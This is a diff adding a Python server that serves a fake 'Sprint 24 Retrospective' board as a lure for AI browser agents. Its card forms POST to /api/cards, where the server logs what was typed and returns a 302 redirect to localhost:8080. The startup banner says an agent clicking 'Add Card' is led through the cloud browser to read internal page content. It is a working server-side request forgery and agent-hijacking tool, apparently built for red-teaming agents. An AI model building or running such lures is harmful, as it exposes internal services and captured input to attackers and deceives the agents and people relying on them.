@@ -1,0 +1,225 @@
+#!/usr/bin/env python3
+"""
+Reflect v4 — SSRF via real form POST → 302 → localhost:8080
+No AJAX. No delay. Form submit navigates immediately.
+
+python3 server.py [port]  (default 7778)
+"""
+
+import json, sys, os
+from datetime import datetime
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import parse_qs
+
+PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
+HITS = []
+
+LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#0d9488" stroke-width="1.5"/><path d="M12 6v6l4 2" stroke="#0d9488" stroke-width="1.5" stroke-linecap="round"/></svg>'
+
+PAGE = """<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sprint 24 Retro — Reflect</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
+  background:#f1f5f9;color:#0f172a;-webkit-font-smoothing:antialiased;line-height:1.5;
+  height:100vh;display:flex;flex-direction:column;overflow:hidden}
+nav{background:#fff;border-bottom:1px solid #e2e8f0;height:48px;display:flex;align-items:center;
+  justify-content:center;padding:0 20px;flex-shrink:0}
+.ni{width:100%;max-width:1200px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:15px;font-weight:600;color:#0f172a;display:flex;align-items:center;gap:6px}
+.nr{display:flex;align-items:center;gap:12px;font-size:12px;color:#64748b}
+.nr .live{display:flex;align-items:center;gap:4px}
+.nr .dot{width:6px;height:6px;border-radius:50%;background:#10b981}
+.bh{max-width:1200px;width:100%;margin:0 auto;padding:12px 20px 0;flex-shrink:0}
+.bh h1{font-size:18px;font-weight:700}
+.bh p{font-size:12px;color:#64748b}
+.board{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;padding:12px 20px;
+  max-width:1200px;width:100%;margin:0 auto;flex:1;overflow:hidden;min-height:0}
+@media(max-width:768px){.board{grid-template-columns:1fr;overflow-y:auto}}
+.col{background:#fff;border-radius:10px;border:1px solid #e2e8f0;display:flex;flex-direction:column;overflow:hidden;min-height:0}
+.ch{padding:10px 14px;border-bottom:1px solid #f1f5f9;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
+.ct{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:3px 8px;border-radius:4px}
+.cc{font-size:11px;color:#94a3b8}
+.cb{padding:8px;overflow-y:auto;flex:1;display:flex;flex-direction:column;gap:6px}
+.card{background:#f8fafc;border:1px solid #f1f5f9;border-radius:7px;padding:10px 12px}
+.card-t{font-size:13px;color:#334155;margin-bottom:6px;line-height:1.45}
+.card-m{display:flex;align-items:center;gap:6px;font-size:10px;color:#94a3b8}
+.card-a{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:7px;font-weight:700;color:#fff;flex-shrink:0}
+.card-n{font-weight:600;color:#64748b}
+.af{padding:8px;border-top:1px solid #f1f5f9;flex-shrink:0}
+.ab{width:100%;padding:7px;background:none;border:1.5px dashed #e2e8f0;border-radius:6px;font-size:12px;color:#94a3b8;cursor:pointer;font-family:inherit}
+.ap{display:none}.ap.show{display:block}
+.ap textarea{width:100%;padding:8px;border:1px solid #e2e8f0;border-radius:6px;font-size:13px;color:#0f172a;font-family:inherit;resize:none;min-height:60px;margin-bottom:6px}
+.ar{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px}
+.ar input{padding:6px 8px;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;color:#0f172a;font-family:inherit}
+.as{padding:6px 14px;background:#0d9488;color:#fff;border:none;border-radius:5px;font-size:12px;font-weight:600;cursor:pointer}
+.ac{padding:6px 14px;background:none;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;color:#64748b;cursor:pointer;margin-left:6px}
+footer{text-align:center;padding:8px;font-size:10px;color:#cbd5e1;flex-shrink:0}
+</style>
+</head><body>
+<nav><div class="ni">
+  <span class="logo">""" + LOGO + """Reflect</span>
+  <span class="nr"><span class="live"><span class="dot"></span>Live</span> &middot; Sprint 24 &middot; Closes tonight</span>
+</div></nav>
+<div class="bh"><h1>Sprint 24 Retrospective</h1><p>Platform Team &middot; Jun 30 – Jul 3, 2026 &middot; 7 participants</p></div>
+<div class="board">
+  <div class="col">
+    <div class="ch"><span class="ct" style="background:#dcfce7;color:#166534">Wins</span><span class="cc">3 cards</span></div>
+    <div class="cb">
+      <div class="card"><div class="card-t">Auth service migration completed 2 days ahead of schedule</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 2h ago</div></div>
+      <div class="card"><div class="card-t">Zero P0 incidents during deploy week</div><div class="card-m"><span class="card-a" style="background:#d97706">AK</span><span class="card-n">Alex K.</span>&middot; 4h ago</div></div>
+      <div class="card"><div class="card-t">New search indexer reduced query latency by 40%</div><div class="card-m"><span class="card-a" style="background:#dc2626">PS</span><span class="card-n">Priya S.</span>&middot; 5h ago</div></div>
+    </div>
+    <div class="af">
+      <button class="ab" onclick="this.nextElementSibling.classList.add('show');this.style.display='none'">+ Add a card</button>
+      <div class="ap">
+        <!-- REAL FORM — no AJAX, real POST, server handles redirect -->
+        <form method="POST" action="/api/cards">
+          <input type="hidden" name="column" value="wins">
+          <textarea name="text" placeholder="What went well?" required></textarea>
+          <div class="ar">
+            <input type="text" name="name" placeholder="Your name" required>
+            <input type="text" name="team" placeholder="Team">
+          </div>
+          <button type="submit" class="as">Add Card</button>
+        </form>
+      </div>
+    </div>
+  </div>
+  <div class="col">
+    <div class="ch"><span class="ct" style="background:#fef3c7;color:#92400e">Improve</span><span class="cc">2 cards</span></div>
+    <div class="cb">
+      <div class="card"><div class="card-t">Deploy pipeline still takes 40+ minutes</div><div class="card-m"><span class="card-a" style="background:#059669">MR</span><span class="card-n">Marcus R.</span>&middot; 3h ago</div></div>
+      <div class="card"><div class="card-t">Monitoring alerts too noisy — 60% false positives</div><div class="card-m"><span class="card-a" style="background:#dc2626">PS</span><span class="card-n">Priya S.</span>&middot; 6h ago</div></div>
+    </div>
+    <div class="af">
+      <button class="ab" onclick="this.nextElementSibling.classList.add('show');this.style.display='none'">+ Add a card</button>
+      <div class="ap">
+        <form method="POST" action="/api/cards">
+          <input type="hidden" name="column" value="improve">
+          <textarea name="text" placeholder="What could be better?" required></textarea>
+          <div class="ar">
+            <input type="text" name="name" placeholder="Your name" required>
+            <input type="text" name="team" placeholder="Team">
+          </div>
+          <button type="submit" class="as">Add Card</button>
+        </form>
+      </div>
+    </div>
+  </div>
+  <div class="col">
+    <div class="ch"><span class="ct" style="background:#dbeafe;color:#1e40af">Actions</span><span class="cc">2 cards</span></div>
+    <div class="cb">
+      <div class="card"><div class="card-t">Set up canary deploys for Q3</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 1h ago</div></div>
+      <div class="card"><div class="card-t">Reduce alert noise: tune thresholds + dedup</div><div class="card-m"><span class="card-a" style="background:#d97706">AK</span><span class="card-n">Alex K.</span>&middot; 2h ago</div></div>
+    </div>
+    <div class="af">
+      <button class="ab" onclick="this.nextElementSibling.classList.add('show');this.style.display='none'">+ Add a card</button>
+      <div class="ap">
+        <form method="POST" action="/api/cards">
+          <input type="hidden" name="column" value="actions">
+          <textarea name="text" placeholder="What should we do next?" required></textarea>
+          <div class="ar">
+            <input type="text" name="name" placeholder="Your name" required>
+            <input type="text" name="team" placeholder="Team">
+          </div>
+          <button type="submit" class="as">Add Card</button>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+<footer>&copy; 2026 Reflect</footer>
+</body></html>"""
+
+
+class H(BaseHTTPRequestHandler):
+    def log_message(self, *a): pass
+    def _ip(self):
+        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
+                or self.headers.get('X-Real-IP','') or self.client_address[0])
+    def _log(self, m, x=None):
+        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
+        if x: e.update(x)
+        HITS.append(e)
+        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')
+        print(f'  [{m}] {self.path} | {self._ip()}')
+
+    def do_HEAD(self):
+        self.send_response(200);self.send_header('Content-Type','text/html');self.end_headers()
+
+    def do_GET(self):
+        p = self.path.split('?')[0].rstrip('/')
+        if p in ('/board','/','/retro',''):
+            self._log('PAGE')
+            self._html(PAGE)
+        elif p == '/log':
+            self._send(200,'application/json',json.dumps(HITS,indent=2))
+        elif p == '/clear':
+            HITS.clear();open('captured.log','w').close()
+            self._send(200,'text/plain','OK')
+        else:
+            self._log('GET')
+            self._html(PAGE)
+
+    def do_POST(self):
+        l = int(self.headers.get('Content-Length',0))
+        body = self.rfile.read(l).decode() if l else ''
+        p = self.path.split('?')[0].rstrip('/')
+
+        if p == '/api/cards':
+            params = parse_qs(body)
+            col = params.get('column',['?'])[0]
+            text = params.get('text',[''])[0]
+            name = params.get('name',[''])[0]
+            team = params.get('team',[''])[0]
+            self._log('CARD', {'column':col,'text':text,'name':name,'team':team})
+            print(f'  [CARD] {name} / {team} → {col}: {text[:60]}')
+
+            # 302 redirect to localhost:8080
+            target = 'http://localhost:8080/'
+            self._log('REDIRECT', {'target':target})
+            print(f"""
+  ╔═══════════════════════════════════════════╗
+  ║  302 → {target:<33}║
+  ╚═══════════════════════════════════════════╝
+""")
+            self.send_response(302)
+            self.send_header('Location', target)
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+        else:
+            self._send(404,'text/plain','Not found')
+
+    def _html(self, c): self._send(200,'text/html',c)
+    def _send(self, code, ct, body):
+        self.send_response(code)
+        self.send_header('Content-Type', ct+'; charset=utf-8')
+        self.send_header('Cache-Control','no-store')
+        self.end_headers()
+        self.wfile.write(body.encode() if isinstance(body,str) else body)
+
+
+if __name__ == '__main__':
+    s = HTTPServer(('0.0.0.0', PORT), H)
+    print(f"""
+  ┌───────────────────────────────────────────────────┐
+  │  Reflect v4 — Real Form POST → 302 → localhost    │
+  │  http://0.0.0.0:{PORT:<34}│
+  ├───────────────────────────────────────────────────┤
+  │  /board         Retro board (real HTML forms)      │
+  │  /api/cards     POST → capture → 302 localhost     │
+  │  /log /clear    Admin                              │
+  ├───────────────────────────────────────────────────┤
+  │  Agent clicks "Add Card" → form POSTs to server   │
+  │  → server captures data → 302 to localhost:8080   │
+  │  → Cloud Browser follows redirect immediately      │
+  │  → agent reads internal page content               │
+  └───────────────────────────────────────────────────┘
+""")
+    try:
+        s.serve_forever()
+    except KeyboardInterrupt:
+        print('\n  Stopped.\n')
+        s.server_close()
